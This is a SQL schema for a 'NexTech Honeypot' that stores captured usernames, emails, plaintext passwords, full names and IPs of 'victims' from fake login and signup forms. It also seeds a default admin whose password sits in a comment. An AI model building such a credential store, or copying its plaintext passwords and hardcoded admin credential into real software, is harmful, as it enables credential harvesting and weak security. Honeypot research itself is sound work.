/*
  # NexTech Honeypot Database Schema

  1. New Tables
    - `victims`
      - `id` (uuid, primary key)
      - `username` (text, captured username)
      - `email` (text, captured email for signup attempts)
      - `password` (text, captured password)
      - `full_name` (text, captured full name for signup attempts)
      - `attempt_type` (text, either 'login' or 'signup')
      - `ip_address` (text, client IP address)
      - `user_agent` (text, browser user agent string)
      - `created_at` (timestamptz, auto-generated timestamp)
    
    - `admins`
      - `id` (uuid, primary key)
      - `username` (text, admin username)
      - `password_hash` (text, bcrypt hashed password)
      - `created_at` (timestamptz, auto-generated timestamp)

  2. Security
    - Enable RLS on `victims` table
    - Add policy for public insert (honeypot functionality)
    - Enable RLS on `admins` table
    - Add policy for admin authentication

  3. Initial Data
    - Create default admin user (nextech_admin)
*/

-- Create victims table for captured honeypot attempts
CREATE TABLE IF NOT EXISTS victims (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text,
  email text,
  password text,
  full_name text,
  attempt_type text CHECK (attempt_type IN ('login', 'signup')) NOT NULL,
  ip_address text,
  user_agent text,
  created_at timestamptz DEFAULT now()
);

-- Create admins table for dashboard authentication
CREATE TABLE IF NOT EXISTS admins (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text UNIQUE NOT NULL,
  password_hash text NOT NULL,
  created_at timestamptz DEFAULT now()
);

-- Enable Row Level Security
ALTER TABLE victims ENABLE ROW LEVEL SECURITY;
ALTER TABLE admins ENABLE ROW LEVEL SECURITY;

-- Create policies for victims table (allow public insert for honeypot)
CREATE POLICY "Allow public insert for honeypot"
  ON victims
  FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Allow authenticated read for dashboard"
  ON victims
  FOR SELECT
  TO authenticated
  USING (true);

-- Create policies for admins table
CREATE POLICY "Admins can read own data"
  ON admins
  FOR SELECT
  TO authenticated
  USING (true);

-- Insert default admin user (username: nextech_admin, password: nextechad1)
INSERT INTO admins (username, password_hash) 
VALUES ('nextech_admin', '$2b$10$TiWEEBt0Vpl2sizwimQ/qOI9SoCl8P71ameGIU19YOMgLSQVgycN2')
ON CONFLICT (username) DO NOTHING;

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_victims_created_at ON victims(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_victims_attempt_type ON victims(attempt_type);
CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username);